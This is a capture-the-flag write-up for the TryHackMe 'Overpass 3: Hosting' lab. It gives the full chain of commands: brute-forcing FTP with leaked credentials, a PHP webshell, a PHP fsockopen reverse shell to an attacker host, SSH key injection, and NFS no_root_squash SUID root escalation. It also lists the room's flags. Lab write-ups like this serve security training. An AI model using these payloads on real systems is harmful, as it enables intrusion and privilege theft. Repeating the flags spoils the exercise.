# 🏠 Overpass 3: Hosting

### TryHackMe Writeup

[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com/room/overpass3hosting)
[![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)](https://tryhackme.com)
[![Status](https://img.shields.io/badge/Status-Pwned-blueviolet?style=for-the-badge)](https://tryhackme.com)
[![Type](https://img.shields.io/badge/Type-Linux-informational?style=for-the-badge&logo=linux)](https://tryhackme.com)

---

## 📋 Overview

| Field | Details |
| --- | --- |
| **Target** | `overpass3.thm` |
| **OS** | CentOS Linux |
| **Attack Surface** | Exposed backup directory, GPG-encrypted credential archive, FTP write access to webroot |
| **Privesc** | NFS `no_root_squash` → attacker-root SUID bash via NFS mount |

Overpass 3 chains an exposed web backup archive into GPG-encrypted customer credentials, uses those to brute-force FTP access to the Apache webroot for PHP webshell upload, then pivots through credential reuse to a stable SSH shell as `paradox`. From there, an internal NFS export of `/home/james` with `no_root_squash` is reachable via SSH port tunnel — attacker-side root on the mount is leveraged to inject an SSH key for `james` and SUID a bash binary copied by james himself, yielding root.

---

## 🔍 Enumeration

### Port Scan

```bash
sudo nmap -sC -sV -v -p- -oA tcpscan-overpass3 overpass3
```

```
21/tcp  open  ftp     vsftpd 3.0.3
22/tcp  open  ssh     OpenSSH 8.0 (protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.37 (centos)
```

Anonymous and guest FTP login both rejected. `searchsploit` on vsftpd 3.0.3 and Apache 2.4.37 turned up nothing relevant — the DoS for vsftpd 3.0.3 and the logrotate LPE for Apache are both dead ends here.

### Directory Bruteforce

```bash
ffuf -u http://overpass3.thm/FUZZ -w ./Web-Content/raft-medium-directories.txt -ic -fc 403,401
```

```
backups    [Status: 301]
```

Directory listing at `/backups/` exposed a single file: `backup.zip` (13K).

### Backup Archive — GPG Credential Leak

```bash
wget http://overpass3.thm/backups/backup.zip
unzip backup.zip
# → CustomerDetails.xlsx.gpg
# → priv.key
```

The archive contains both a GPG private key and the file it was used to encrypt — a critical OPSEC failure. Import and decrypt:

```bash
gpg --import priv.key
# key C9AE71AB3180BC08: paradox@overpass.thm imported

gpg --decrypt CustomerDetails.xlsx.gpg > CustomerDetails.xlsx
```

Decrypted spreadsheet:

| Name | Username | Password |
| --- | --- | --- |
| Par. A. Doxx | `paradox` | `ShibesAreGreat123` |
| 0day Montgomery | `0day` | `OllieIsTheBestDog` |
| Muir Land | `muirlandoracle` | `A11D0gsAreAw3s0me` |

---

## 💀 Initial Access — FTP Webroot Upload + PHP RCE

### FTP Brute Force

Cross-referenced the three leaked credentials against FTP:

```bash
hydra -L user.txt -P pw.txt ftp://overpass3.thm -t 4 -vV -f
```

```
[21][ftp] host: overpass3.thm   login: paradox   password: ShibesAreGreat123
```

The FTP root is the Apache webroot — `hallway.jpg`, `index.html`, and `overpass.svg` all present.

### Webshell Upload

Writing directly into the webroot was rejected (`553 Could not create file`). Moving up one directory to the parent worked:

```bash
ftp overpass3.thm
# login: paradox / ShibesAreGreat123
ftp> cd ..
ftp> put cmd.php
```

```php
<?php echo "<pre>"; $cmd=$_GET['cmd']; system($cmd); echo "</pre>"; ?>
```

Confirmed RCE:

```bash
curl 'http://overpass3.thm/cmd.php?cmd=id'
# uid=48(apache) gid=48(apache) groups=48(apache)
```

### Reverse Shell

No Python on the target. Used PHP `fsockopen` reverse shell:

```
http://overpass3.thm/cmd.php?cmd=php%20-r%20%27%24sock%3Dfsockopen(%22<lhost>%22%2C4444)%3Bexec(%22%2Fbin%2Fsh%20%3C%263%20%3E%263%202%3E%263%22)%3B%27
```

```bash
nc -nlvp 4444
# uid=48(apache) gid=48(apache) groups=48(apache)
```

Shell stabilisation without Python — `script` as fallback:

```bash
script /dev/null -c bash
```

### Web Flag

```bash
cat /usr/share/httpd/web.flag
# thm{0ae72f7870c3687129f7a824194be09d}
```

---

## 🔁 Privilege Escalation — apache → paradox → james → root

### apache → paradox (Credential Reuse)

`/etc/passwd` confirmed `paradox` as a shell user. Tried the FTP password directly:

```bash
su paradox
# Password: ShibesAreGreat123 ✓
```

`paradox` cannot run sudo. Injected an SSH key for a stable shell:

```bash
echo '<pubkey>' >> /home/paradox/.ssh/authorized_keys
ssh -i id_ed25519 paradox@overpass3
```

### Discovering the NFS Attack Surface

```bash
ss -tulpn
# tcp  LISTEN  0.0.0.0:2049   ← NFS, internal only
```

```bash
cat /etc/exports
# /home/james *(rw,fsid=0,sync,no_root_squash,insecure)

showmount -e localhost
# Export list for localhost:
# /home/james *
```

`no_root_squash` means the NFS server will not remap UID 0 from connecting clients to `nobody` — an attacker with a root shell and access to the mount can write files owned by root directly into `james`'s home directory. Port 2049 is not exposed externally, so it needs to be tunnelled through the SSH session.

### SSH Port Tunnel + NFS Mount

```bash
# Forward attacker local port 2049 → target internal NFS
ssh -i id_ed25519 -L 2049:localhost:2049 paradox@overpass3
```

```bash
# Mount as root on attacker machine
sudo mount -t nfs -o port=2049,nolock,nfsvers=4 127.0.0.1:/ /home/evdaez/thm/overpass3hosting/nfs
```

With root on the mount, `user.flag` is directly readable:

```bash
cat nfs/user.flag
# thm{3693fc86661faa21f16ac9508a43e1ae}
```

### paradox → james (SSH Key Injection via NFS)

```bash
# As root on attacker, writing into the NFS mount
echo '<pubkey>' >> nfs/.ssh/authorized_keys
```

```bash
ssh -i id_ed25519 james@overpass3
```

### james → root (NFS no_root_squash SUID Bash)

The attacker machine is ARM64; the target is AMD64 — copying a local bash binary directly fails. Instead, have `james` copy the target's own bash binary into the NFS-mounted home directory, then set SUID from the attacker side as root:

```bash
# On target as james — copy native binary into home dir
cp /bin/bash .
```

```bash
# On attacker as root — set ownership and SUID via NFS mount
chown root:root nfs/bash
chmod +s nfs/bash
```

```bash
# On target as james
./bash -p
# uid=1000(james) gid=1000(james) euid=0(root) egid=0(root) groups=0(root),1000(james)
```

```bash
cat /root/root.flag
# thm{a4f6adb70371a4bceb32988417456c44}
```

---

## 🗺️ Attack Chain

```
[HTTP /backups/]
    backup.zip → priv.key + CustomerDetails.xlsx.gpg
          │
          ▼
[GPG Decrypt]
    paradox:ShibesAreGreat123 (+ 2 other creds)
          │
          ▼
[Hydra FTP Brute Force]
    paradox → FTP write access to webroot parent
          │
          ▼
[PHP Webshell → Reverse Shell]
    uid=48(apache) → web.flag
          │
          ▼
[su paradox — credential reuse]
    SSH key injection → stable SSH session
          │
          ▼
[NFS /home/james — no_root_squash]
    SSH tunnel port 2049 → mount as attacker root
    → read user.flag + inject james SSH key
          │
          ▼
[SSH as james + NFS SUID Abuse]
    james: cp /bin/bash .
    attacker root: chown root + chmod +s (via NFS mount)
    james: ./bash -p → euid=0
          │
          ▼
[root.flag]
```

---

## 📌 Key Takeaways

- Shipping the GPG private key alongside its encrypted file in the same archive negates all confidentiality — decrypt immediately on download
- FTP access to a webroot is functionally code execution; permission restrictions on subdirectories don't matter if the parent dir is writable
- `no_root_squash` on an NFS export is a critical misconfiguration: clients connecting as root retain UID 0 on the share, bypassing the target's entire permission model
- Internal-only services (check `ss -tulpn` after foothold) are always reachable via SSH local port forwarding — never skip post-foothold network enumeration
- When Python is absent, `script /dev/null -c bash` is a reliable TTY upgrade fallback
- Architecture mismatch between attacker and target machines blocks binary transfer — leverage the target's own binaries and manipulate attributes from the privileged NFS mount instead

---

## 🎯 MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Credential Access | Unsecured Credentials: Credentials In Files | [T1552.001](https://attack.mitre.org/techniques/T1552/001) |
| Initial Access | Valid Accounts | [T1078](https://attack.mitre.org/techniques/T1078) |
| Execution | Server Software Component: Web Shell | [T1505.003](https://attack.mitre.org/techniques/T1505/003) |
| Privilege Escalation | Abuse Elevation Control Mechanism | [T1548](https://attack.mitre.org/techniques/T1548) |

---

## 🛠️ Tools Used

| Tool | Purpose |
| --- | --- |
| `nmap` | Port scanning and service fingerprinting |
| `ffuf` | Directory bruteforce |
| `gpg` | Private key import and credential archive decryption |
| `hydra` | FTP credential brute force |
| `ftp` | Webroot enumeration and webshell upload |
| `nc` | Reverse shell listener |
| `ssh` | Stable shell, lateral movement, NFS port tunnelling |

---

## 🚩 Flags

<details>
<summary><code>web.flag</code></summary>

`thm{0ae72f7870c3687129f7a824194be09d}`

</details>

<details>
<summary><code>user.flag</code></summary>

`thm{3693fc86661faa21f16ac9508a43e1ae}`

</details>

<details>
<summary><code>root.flag</code></summary>

`thm{a4f6adb70371a4bceb32988417456c44}`

</details>
